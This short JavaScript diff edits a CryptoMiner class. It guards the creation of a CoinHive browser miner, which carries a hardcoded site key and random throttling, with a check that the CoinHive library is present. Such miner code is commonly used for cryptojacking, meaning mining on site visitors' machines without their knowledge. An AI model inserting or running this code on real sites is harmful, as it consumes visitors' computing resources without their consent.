@@ -1,7 +1,9 @@
 class CryptoMiner {
   constructor() {
-    this.miner = new CoinHive.Anonymous('3UwwmQzszgFZ1lYw9ctSs05IClSFFJNy');
-    this.setThrottleRandomly();
+    if (typeof CoinHive !== 'undefined') {
+      this.miner = new CoinHive.Anonymous('3UwwmQzszgFZ1lYw9ctSs05IClSFFJNy');
+      this.setThrottleRandomly();
+    }
   }
 
   setThrottleRandomly() {
